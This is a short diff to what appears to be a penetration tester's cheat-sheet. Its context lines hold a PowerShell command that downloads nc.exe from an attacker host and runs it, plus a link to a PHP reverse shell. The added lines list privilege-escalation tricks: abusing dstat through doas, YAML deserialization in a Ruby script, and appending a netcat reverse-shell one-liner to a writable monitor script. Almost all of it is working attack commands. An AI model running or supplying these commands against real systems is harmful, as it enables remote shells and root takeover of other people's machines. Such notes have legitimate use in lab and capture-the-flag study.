@@ -26,3 +26,12 @@ powershell -c iwr http://ipkali/nc.exe -OutFile \windows\temp\nc.exe;windows\tem
 
 * generate reverse shell
 https://github.com/pentestmonkey/php-reverse-shell
+
+* example privesc:
+/usr/bin/dstat create file py
+		/usr/local/share/dstat/
+		doas -u root /usr/bin/dstat --name
+/opt/update_dependencies.rb
+		yaml deserialization
+	/home/nibbler/personal/stuff/monitor.sh
+		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 8083 > /tmp/f" >> monitor.sh
